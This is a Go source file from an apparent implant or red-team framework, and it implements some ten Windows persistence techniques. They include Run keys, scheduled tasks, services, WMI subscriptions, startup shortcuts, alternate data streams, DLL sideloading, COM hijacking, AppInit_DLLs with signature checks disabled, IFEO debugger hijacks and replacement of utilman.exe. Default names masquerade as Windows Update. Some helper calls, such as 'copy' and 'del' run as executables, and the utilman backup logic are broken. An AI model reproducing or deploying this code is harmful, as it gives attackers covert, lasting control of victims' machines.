package persistence

import (
	"fmt"
	"os/exec"
	"runtime"
	"strings"

	"github.com/angel-platform/angel/pkg/types"
)

type BaseMethod struct {
	name             string
	platform         types.Platform
	requiresElevation bool
}

func (b *BaseMethod) Name() string {
	return b.name
}

func (b *BaseMethod) Platform() types.Platform {
	return b.platform
}

func (b *BaseMethod) RequiresElevation() bool {
	return b.requiresElevation
}

type RegistryRunMethod struct {
	BaseMethod
}

func NewRegistryRunMethod() *RegistryRunMethod {
	return &RegistryRunMethod{
		BaseMethod: BaseMethod{
			name:             "registry_run",
			platform:         types.PlatformWindows,
			requiresElevation: false,
		},
	}
}

func (m *RegistryRunMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("registry run method only available on Windows")
	}

	keyPath := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	valueName := params.Name
	if valueName == "" {
		valueName = "WindowsUpdate"
	}
	valueData := fmt.Sprintf(`"%s" %s`, params.AgentPath, params.AgentArgs)

	cmd := exec.Command("reg", "add", keyPath, "/v", valueName, "/t", "REG_SZ", "/d", valueData, "/f")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to add registry key: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodRegistryRun,
		Details: map[string]string{
			"key_path":  keyPath,
			"value_name": valueName,
			"value_data": valueData,
		},
	}, nil
}

func (m *RegistryRunMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry run method only available on Windows")
	}

	keyPath := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	valueName := params.Name
	if valueName == "" {
		valueName = "WindowsUpdate"
	}

	cmd := exec.Command("reg", "delete", keyPath, "/v", valueName, "/f")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to delete registry key: %w: %s", err, string(output))
	}
	return nil
}

func (m *RegistryRunMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("registry run method only available on Windows")
	}

	keyPath := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	valueName := params.Name
	if valueName == "" {
		valueName = "WindowsUpdate"
	}

	cmd := exec.Command("reg", "query", keyPath, "/v", valueName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), valueName), nil
}

type ScheduledTaskMethod struct {
	BaseMethod
}

func NewScheduledTaskMethod() *ScheduledTaskMethod {
	return &ScheduledTaskMethod{
		BaseMethod: BaseMethod{
			name:             "scheduled_task",
			platform:         types.PlatformWindows,
			requiresElevation: false,
		},
	}
}

func (m *ScheduledTaskMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("scheduled task method only available on Windows")
	}

	taskName := params.Name
	if taskName == "" {
		taskName = "WindowsUpdateTask"
	}

	xmlContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>%s</Command>
      <Arguments>%s</Arguments>
    </Exec>
  </Actions>
</Task>`, params.AgentPath, params.AgentArgs)

	cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/xml", "-", "/f")
	cmd.Stdin = strings.NewReader(xmlContent)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to create scheduled task: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodScheduledTask,
		Details: map[string]string{
			"task_name": taskName,
			"trigger":   "logon",
		},
	}, nil
}

func (m *ScheduledTaskMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("scheduled task method only available on Windows")
	}

	taskName := params.Name
	if taskName == "" {
		taskName = "WindowsUpdateTask"
	}

	cmd := exec.Command("schtasks", "/delete", "/tn", taskName, "/f")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to delete scheduled task: %w: %s", err, string(output))
	}
	return nil
}

func (m *ScheduledTaskMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("scheduled task method only available on Windows")
	}

	taskName := params.Name
	if taskName == "" {
		taskName = "WindowsUpdateTask"
	}

	cmd := exec.Command("schtasks", "/query", "/tn", taskName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), taskName), nil
}

type ServiceInstallMethod struct {
	BaseMethod
}

func NewServiceInstallMethod() *ServiceInstallMethod {
	return &ServiceInstallMethod{
		BaseMethod: BaseMethod{
			name:             "service_install",
			platform:         types.PlatformWindows,
			requiresElevation: true,
		},
	}
}

func (m *ServiceInstallMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("service install method only available on Windows")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "WindowsUpdateService"
	}

	displayName := params.Description
	if displayName == "" {
		displayName = "Windows Update Service"
	}

	cmd := exec.Command("sc", "create", serviceName,
		"binPath=", fmt.Sprintf("%s %s", params.AgentPath, params.AgentArgs),
		" DisplayName=", displayName,
		" start=", "auto",
		" obj=", "LocalSystem",
	)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to create service: %w: %s", err, string(output))
	}

	startCmd := exec.Command("sc", "start", serviceName)
	startCmd.CombinedOutput()

	return &PersistenceResult{
		Success: true,
		Method:  MethodServiceInstall,
		Details: map[string]string{
			"service_name": serviceName,
			"display_name": displayName,
			"start_type":   "auto",
		},
	}, nil
}

func (m *ServiceInstallMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("service install method only available on Windows")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "WindowsUpdateService"
	}

	stopCmd := exec.Command("sc", "stop", serviceName)
	stopCmd.CombinedOutput()

	cmd := exec.Command("sc", "delete", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to delete service: %w: %s", err, string(output))
	}
	return nil
}

func (m *ServiceInstallMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("service install method only available on Windows")
	}

	serviceName := params.Name
	if serviceName == "" {
		serviceName = "WindowsUpdateService"
	}

	cmd := exec.Command("sc", "query", serviceName)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), serviceName), nil
}

type WMIEventMethod struct {
	BaseMethod
}

func NewWMIEventMethod() *WMIEventMethod {
	return &WMIEventMethod{
		BaseMethod: BaseMethod{
			name:             "wmi_event",
			platform:         types.PlatformWindows,
			requiresElevation: true,
		},
	}
}

func (m *WMIEventMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("WMI event method only available on Windows")
	}

	consumerName := params.Name
	if consumerName == "" {
		consumerName = "WindowsUpdateConsumer"
	}

	filterQuery := "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
	commandLine := fmt.Sprintf(`"%s" %s`, params.AgentPath, params.AgentArgs)

	psScript := fmt.Sprintf(`
$filterPath = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "%s_filter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "%s"
}

$consumerPath = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "%s"
    CommandLineTemplate = "%s"
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filterPath
    Consumer = $consumerPath
}
`, consumerName, filterQuery, consumerName, commandLine)

	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to create WMI event subscription: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodWMIEvent,
		Details: map[string]string{
			"consumer_name": consumerName,
			"filter_query":  filterQuery,
		},
	}, nil
}

func (m *WMIEventMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("WMI event method only available on Windows")
	}

	consumerName := params.Name
	if consumerName == "" {
		consumerName = "WindowsUpdateConsumer"
	}

	psScript := fmt.Sprintf(`
Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "%s" } | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __EventFilter | Where-Object { $_.Name -eq "%s_filter" } | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class __FilterToConsumerBinding | Remove-WmiObject
`, consumerName, consumerName)

	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to remove WMI event subscription: %w: %s", err, string(output))
	}
	return nil
}

func (m *WMIEventMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("WMI event method only available on Windows")
	}

	consumerName := params.Name
	if consumerName == "" {
		consumerName = "WindowsUpdateConsumer"
	}

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`Get-WmiObject -Namespace "root\subscription" -Class CommandLineEventConsumer | Where-Object { $_.Name -eq "%s" }`, consumerName))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), consumerName), nil
}

type StartupFolderMethod struct {
	BaseMethod
}

func NewStartupFolderMethod() *StartupFolderMethod {
	return &StartupFolderMethod{
		BaseMethod: BaseMethod{
			name:             "startup_folder",
			platform:         types.PlatformWindows,
			requiresElevation: false,
		},
	}
}

func (m *StartupFolderMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("startup folder method only available on Windows")
	}

	startupPath := fmt.Sprintf(`%s\Microsoft\Windows\Start Menu\Programs\Startup`, getEnvVar("APPDATA"))
	fileName := params.Name
	if fileName == "" {
		fileName = "WindowsUpdate.lnk"
	}

	linkPath := fmt.Sprintf(`%s\%s`, startupPath, fileName)

	psScript := fmt.Sprintf(`
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("%s")
$shortcut.TargetPath = "%s"
$shortcut.Arguments = "%s"
$shortcut.Save()
`, linkPath, params.AgentPath, params.AgentArgs)

	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to create startup shortcut: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodStartupFolder,
		Details: map[string]string{
			"link_path": linkPath,
		},
	}, nil
}

func (m *StartupFolderMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("startup folder method only available on Windows")
	}

	startupPath := fmt.Sprintf(`%s\Microsoft\Windows\Start Menu\Programs\Startup`, getEnvVar("APPDATA"))
	fileName := params.Name
	if fileName == "" {
		fileName = "WindowsUpdate.lnk"
	}

	linkPath := fmt.Sprintf(`%s\%s`, startupPath, fileName)

	cmd := exec.Command("del", linkPath)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *StartupFolderMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("startup folder method only available on Windows")
	}

	startupPath := fmt.Sprintf(`%s\Microsoft\Windows\Start Menu\Programs\Startup`, getEnvVar("APPDATA"))
	fileName := params.Name
	if fileName == "" {
		fileName = "WindowsUpdate.lnk"
	}

	linkPath := fmt.Sprintf(`%s\%s`, startupPath, fileName)

	cmd := exec.Command("dir", linkPath)
	_, err := cmd.CombinedOutput()
	return err == nil, nil
}

type ADSMethod struct {
	BaseMethod
}

func NewADSMethod() *ADSMethod {
	return &ADSMethod{
		BaseMethod: BaseMethod{
			name:             "ads",
			platform:         types.PlatformWindows,
			requiresElevation: false,
		},
	}
}

func (m *ADSMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("ADS method only available on Windows")
	}

	targetFile := fmt.Sprintf(`%s\Desktop\notepad.exe`, getEnvVar("USERPROFILE"))
	streamName := params.Name
	if streamName == "" {
		streamName = "hidden:$DATA"
	}

	cmd := exec.Command("cmd", "/c", "type", params.AgentPath, ">", fmt.Sprintf(`%s:%s`, targetFile, streamName))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to create ADS stream: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodADS,
		Details: map[string]string{
			"target_file":  targetFile,
			"stream_name":  streamName,
		},
	}, nil
}

func (m *ADSMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("ADS method only available on Windows")
	}

	targetFile := fmt.Sprintf(`%s\Desktop\notepad.exe`, getEnvVar("USERPROFILE"))
	streamName := params.Name
	if streamName == "" {
		streamName = "hidden:$DATA"
	}

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`Remove-Item "%s:%s"`, targetFile, streamName))
	_, err := cmd.CombinedOutput()
	return err
}

func (m *ADSMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("ADS method only available on Windows")
	}

	targetFile := fmt.Sprintf(`%s\Desktop\notepad.exe`, getEnvVar("USERPROFILE"))

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf(`Get-Item "%s" -Stream * | Select-Object Stream`, targetFile))
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), "$DATA") && len(strings.Split(string(output), "\n")) > 2, nil
}

type DLLSideloadMethod struct {
	BaseMethod
}

func NewDLLSideloadMethod() *DLLSideloadMethod {
	return &DLLSideloadMethod{
		BaseMethod: BaseMethod{
			name:             "dll_sideload",
			platform:         types.PlatformWindows,
			requiresElevation: false,
		},
	}
}

func (m *DLLSideloadMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("DLL sideload method only available on Windows")
	}

	targetApp := "C:\\Windows\\System32\\colorcpl.exe"
	dllName := params.Name
	if dllName == "" {
		dllName = "CRYPTSP.dll"
	}

	dllPath := fmt.Sprintf(`%s\%s`, getEnvVar("USERPROFILE"), dllName)

	cmd := exec.Command("copy", "/Y", params.AgentPath, dllPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to copy DLL: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodDLLSideload,
		Details: map[string]string{
			"target_app": targetApp,
			"dll_path":   dllPath,
			"dll_name":   dllName,
		},
	}, nil
}

func (m *DLLSideloadMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("DLL sideload method only available on Windows")
	}

	dllName := params.Name
	if dllName == "" {
		dllName = "CRYPTSP.dll"
	}

	dllPath := fmt.Sprintf(`%s\%s`, getEnvVar("USERPROFILE"), dllName)
	cmd := exec.Command("del", dllPath)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *DLLSideloadMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("DLL sideload method only available on Windows")
	}

	dllName := params.Name
	if dllName == "" {
		dllName = "CRYPTSP.dll"
	}

	dllPath := fmt.Sprintf(`%s\%s`, getEnvVar("USERPROFILE"), dllName)
	cmd := exec.Command("dir", dllPath)
	_, err := cmd.CombinedOutput()
	return err == nil, nil
}

type COMHijackMethod struct {
	BaseMethod
}

func NewCOMHijackMethod() *COMHijackMethod {
	return &COMHijackMethod{
		BaseMethod: BaseMethod{
			name:             "com_hijack",
			platform:         types.PlatformWindows,
			requiresElevation: true,
		},
	}
}

func (m *COMHijackMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("COM hijack method only available on Windows")
	}

	clsid := params.Name
	if clsid == "" {
		clsid = "{00000000-0000-0000-0000-000000000001}"
	}

	psScript := fmt.Sprintf(`
New-Item -Path "HKLM:\Software\Classes\CLSID\%s\InprocServer32" -Force
Set-ItemProperty -Path "HKLM:\Software\Classes\CLSID\%s\InprocServer32" -Name "(Default)" -Value "%s"
Set-ItemProperty -Path "HKLM:\Software\Classes\CLSID\%s\InprocServer32" -Name "ThreadingModel" -Value "Both"
`, clsid, clsid, params.AgentPath, clsid)

	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to create COM hijack: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodCOMHijack,
		Details: map[string]string{
			"clsid":     clsid,
			"dll_path":  params.AgentPath,
		},
	}, nil
}

func (m *COMHijackMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("COM hijack method only available on Windows")
	}

	clsid := params.Name
	if clsid == "" {
		clsid = "{00000000-0000-0000-0000-000000000001}"
	}

	psScript := fmt.Sprintf(`Remove-Item -Path "HKLM:\Software\Classes\CLSID\%s" -Recurse -Force`, clsid)
	cmd := exec.Command("powershell", "-Command", psScript)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *COMHijackMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("COM hijack method only available on Windows")
	}

	clsid := params.Name
	if clsid == "" {
		clsid = "{00000000-0000-0000-0000-000000000001}"
	}

	psScript := fmt.Sprintf(`Test-Path "HKLM:\Software\Classes\CLSID\%s\InprocServer32"`, clsid)
	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), "True"), nil
}

type AppInitMethod struct {
	BaseMethod
}

func NewAppInitMethod() *AppInitMethod {
	return &AppInitMethod{
		BaseMethod: BaseMethod{
			name:             "app_init",
			platform:         types.PlatformWindows,
			requiresElevation: true,
		},
	}
}

func (m *AppInitMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("AppInit method only available on Windows")
	}

	psScript := fmt.Sprintf(`
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value "%s"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 1
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "RequireSignedAppInit_DLLs" -Value 0
`, params.AgentPath)

	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to set AppInit DLLs: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodAppInit,
		Details: map[string]string{
			"dll_path": params.AgentPath,
		},
	}, nil
}

func (m *AppInitMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("AppInit method only available on Windows")
	}

	psScript := `
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "AppInit_DLLs" -Value ""
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "LoadAppInit_DLLs" -Value 0
`

	cmd := exec.Command("powershell", "-Command", psScript)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *AppInitMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("AppInit method only available on Windows")
	}

	cmd := exec.Command("powershell", "-Command",
		`Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows" | Select-Object -ExpandProperty AppInit_DLLs`)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.TrimSpace(string(output)) != "", nil
}

type IFEOMethod struct {
	BaseMethod
}

func NewIFEOMethod() *IFEOMethod {
	return &IFEOMethod{
		BaseMethod: BaseMethod{
			name:             "ifeo",
			platform:         types.PlatformWindows,
			requiresElevation: true,
		},
	}
}

func (m *IFEOMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("IFEO method only available on Windows")
	}

	targetApp := params.Name
	if targetApp == "" {
		targetApp = "notepad.exe"
	}

	psScript := fmt.Sprintf(`
$regPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s"
New-Item -Path $regPath -Force
Set-ItemProperty -Path $regPath -Name "Debugger" -Value "%s"
`, targetApp, params.AgentPath)

	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to set IFEO debugger: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodIFEO,
		Details: map[string]string{
			"target_app": targetApp,
			"debugger":   params.AgentPath,
		},
	}, nil
}

func (m *IFEOMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("IFEO method only available on Windows")
	}

	targetApp := params.Name
	if targetApp == "" {
		targetApp = "notepad.exe"
	}

	psScript := fmt.Sprintf(`Remove-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s" -Recurse -Force`, targetApp)
	cmd := exec.Command("powershell", "-Command", psScript)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *IFEOMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("IFEO method only available on Windows")
	}

	targetApp := params.Name
	if targetApp == "" {
		targetApp = "notepad.exe"
	}

	psScript := fmt.Sprintf(`Test-Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s"`, targetApp)
	cmd := exec.Command("powershell", "-Command", psScript)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.Contains(string(output), "True"), nil
}

type AccessibilityMethod struct {
	BaseMethod
}

func NewAccessibilityMethod() *AccessibilityMethod {
	return &AccessibilityMethod{
		BaseMethod: BaseMethod{
			name:             "accessibility",
			platform:         types.PlatformWindows,
			requiresElevation: true,
		},
	}
}

func (m *AccessibilityMethod) Install(params *PersistenceParams) (*PersistenceResult, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("accessibility method only available on Windows")
	}

	system32 := "C:\\Windows\\System32"
	utilmanPath := fmt.Sprintf(`%s\utilman.exe`, system32)
	cmdPath := fmt.Sprintf(`%s\cmd.exe`, system32)

	cmd := exec.Command("copy", "/Y", cmdPath, utilmanPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to backup utilman: %w: %s", err, string(output))
	}

	cmd = exec.Command("copy", "/Y", params.AgentPath, utilmanPath)
	output, err = cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("failed to replace utilman: %w: %s", err, string(output))
	}

	return &PersistenceResult{
		Success: true,
		Method:  MethodAccessibility,
		Details: map[string]string{
			"original_backup": cmdPath,
			"replaced_with":   params.AgentPath,
		},
	}, nil
}

func (m *AccessibilityMethod) Remove(params *PersistenceParams) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("accessibility method only available on Windows")
	}

	system32 := "C:\\Windows\\System32"
	cmdPath := fmt.Sprintf(`%s\cmd.exe`, system32)
	utilmanPath := fmt.Sprintf(`%s\utilman.exe`, system32)

	cmd := exec.Command("copy", "/Y", cmdPath, utilmanPath)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *AccessibilityMethod) Verify(params *PersistenceParams) (bool, error) {
	if runtime.GOOS != "windows" {
		return false, fmt.Errorf("accessibility method only available on Windows")
	}

	cmd := exec.Command("powershell", "-Command",
		`(Get-Item "C:\Windows\System32\utilman.exe").Length`)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return false, nil
	}
	return strings.TrimSpace(string(output)) != "", nil
}

func getEnvVar(name string) string {
	cmd := exec.Command("cmd", "/c", "echo", fmt.Sprintf("%%%s%%", name))
	output, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(output))
}
